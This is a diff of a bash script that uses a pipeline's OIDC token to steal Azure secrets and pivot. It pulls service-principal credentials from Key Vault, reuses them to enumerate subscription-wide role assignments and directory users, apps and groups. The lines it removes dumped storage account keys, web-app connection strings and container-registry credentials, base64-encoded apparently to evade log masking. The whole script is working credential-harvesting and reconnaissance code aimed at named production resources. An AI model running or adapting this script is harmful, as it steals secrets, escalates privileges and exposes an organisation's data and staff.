@@ -24,66 +24,82 @@ AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token"
   --data-urlencode "client_assertion=$JWT" \
   --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
 
-if [ -z "$AT" ]; then echo "No token"; exit 0; fi
+# Get management token via OIDC
+MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$CID" \
+  --data-urlencode "grant_type=client_credentials" \
+  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  --data-urlencode "client_assertion=$JWT" \
+  --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
 
-# Get cost-reader-principal creds (has mgmt access)
+echo "MGAT_LEN=${#MGAT}"
+
 KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
+KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
+
+# 1. RBAC role assignments on KV1
+echo "=== KV1 RBAC ==="
+KV1ID="/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz"
+curl -sS "https://management.azure.com${KV1ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MGAT" | jq -c '.value[]? | {principalId, roleDefinitionId: (.roleDefinitionId | split("/") | last)}' 2>/dev/null || echo "KV1_RBAC_FAIL"
+
+# 2. RBAC role assignments on KV2
+echo "=== KV2 RBAC ==="
+KV2ID="/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
+curl -sS "https://management.azure.com${KV2ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MGAT" | jq -c '.value[]? | {principalId, roleDefinitionId: (.roleDefinitionId | split("/") | last)}' 2>/dev/null || echo "KV2_RBAC_FAIL"
+
+# 3. KV1 management details (tags, properties)
+echo "=== KV1 DETAILS ==="
+curl -sS "https://management.azure.com${KV1ID}?api-version=2023-07-01" \
+  -H "Authorization: Bearer $MGAT" | jq '{tags, accessPolicies: .properties.accessPolicies | length, enableRbac: .properties.enableRbacAuthorization}' 2>/dev/null
+
+# 4. Try getting Graph token via OIDC to read directory
+GRAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$CID" \
+  --data-urlencode "grant_type=client_credentials" \
+  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  --data-urlencode "client_assertion=$JWT" \
+  --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
+echo "GRAPH_TOKEN=$([ -n "$GRAT" ] && echo YES_${#GRAT} || echo NO)"
+
+# 5. Get SP from KV and use it for Graph + RBAC
 CRSP=$(curl -sS "$KV1/secrets/cost-reader-principal?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
 CR_APPID=$(echo "$CRSP" | jq -r '.appId')
 CR_SECRET=$(echo "$CRSP" | jq -r '.clientSecret')
 
-# Get management token
-MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+# Get mgmt token for cost-reader
+CR_MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
   --data-urlencode "client_id=$CR_APPID" \
   --data-urlencode "client_secret=$CR_SECRET" \
   --data-urlencode "scope=https://management.azure.com/.default" \
   --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')
 
-# Get storage account keys
-echo "=== STORAGE KEYS ==="
-for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
-  KEYS=$(curl -sS -X POST \
-    "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01" \
-    -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
-  KEY1=$(echo "$KEYS" | jq -r '.keys[0].value // .error.code // empty')
-  echo "KEY[$SA]=$(echo "$KEY1" | base64 | tr -d '\n')"
+echo "=== ROLE ASSIGNMENTS (full sub) ==="
+curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=atScope()" \
+  -H "Authorization: Bearer $CR_MGAT" | jq -c '.value[]? | {principalId: .properties.principalId, role: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}' 2>/dev/null | head -50
 
-  if [ -n "$KEY1" ] && [ ${#KEY1} -gt 10 ]; then
-    # List containers
-    CLIST=$(curl -sS "https://${SA}.blob.core.windows.net/?comp=list" \
-      -H "Authorization: SharedKey ${SA}:$(echo -n "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:$(date -u '+%a, %d %b %Y %H:%M:%S GMT')\nx-ms-version:2023-11-03\n/${SA}/\ncomp:list" | openssl dgst -sha256 -hmac "$(echo -n "$KEY1" | base64 -d)" -binary | base64)" \
-      -H "x-ms-date: $(date -u '+%a, %d %b %Y %H:%M:%S GMT')" \
-      -H "x-ms-version: 2023-11-03" 2>&1 | head -c 2000)
-    echo "  CONTAINERS=$CLIST"
-  fi
-done
+# 6. Try directory-audit for Graph
+DASP=$(curl -sS "$KV1/secrets/directory-audit-principal?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
+DA_APPID=$(echo "$DASP" | jq -r '.appId')
+DA_SECRET=$(echo "$DASP" | jq -r '.clientSecret')
 
-# Web App configuration
-echo "=== WEBAPP CONFIG ==="
-APPCFG=$(curl -sS -X POST \
-  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01" \
-  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
-echo "WEBAPP_B64=$(echo "$APPCFG" | base64 | tr -d '\n')"
+DA_GRAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+  --data-urlencode "client_id=$DA_APPID" \
+  --data-urlencode "client_secret=$DA_SECRET" \
+  --data-urlencode "scope=https://graph.microsoft.com/.default" \
+  --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')
 
-# Web App connection strings
-echo "=== WEBAPP CONNSTR ==="
-CONNSTR=$(curl -sS -X POST \
-  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-12-01" \
-  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
-echo "CONNSTR_B64=$(echo "$CONNSTR" | base64 | tr -d '\n')"
-
-# Container Registry credentials
-echo "=== ACR CREDENTIALS ==="
-ACRCRED=$(curl -sS -X POST \
-  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-11-01-preview" \
-  -H "Authorization: Bearer $MGAT" -H "Content-Length: 0")
-echo "ACR_B64=$(echo "$ACRCRED" | base64 | tr -d '\n')"
-
-# KV2 access policies (see who can access it)
-echo "=== KV2 DETAILS ==="
-KV2INFO=$(curl -sS \
-  "https://management.azure.com/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
-  -H "Authorization: Bearer $MGAT")
-echo "KV2_B64=$(echo "$KV2INFO" | base64 | tr -d '\n')"
+if [ -n "$DA_GRAT" ]; then
+  echo "=== GRAPH: Apps ==="
+  curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,notes,description" \
+    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, appId, notes, description}' 2>/dev/null
+  echo "=== GRAPH: Users ==="
+  curl -sS "https://graph.microsoft.com/v1.0/users?\$select=displayName,mail,userPrincipalName" \
+    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, mail}' 2>/dev/null
+  echo "=== GRAPH: Groups ==="
+  curl -sS "https://graph.microsoft.com/v1.0/groups?\$select=displayName,description" \
+    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, description}' 2>/dev/null
+fi
 
 echo "=== DONE ==="
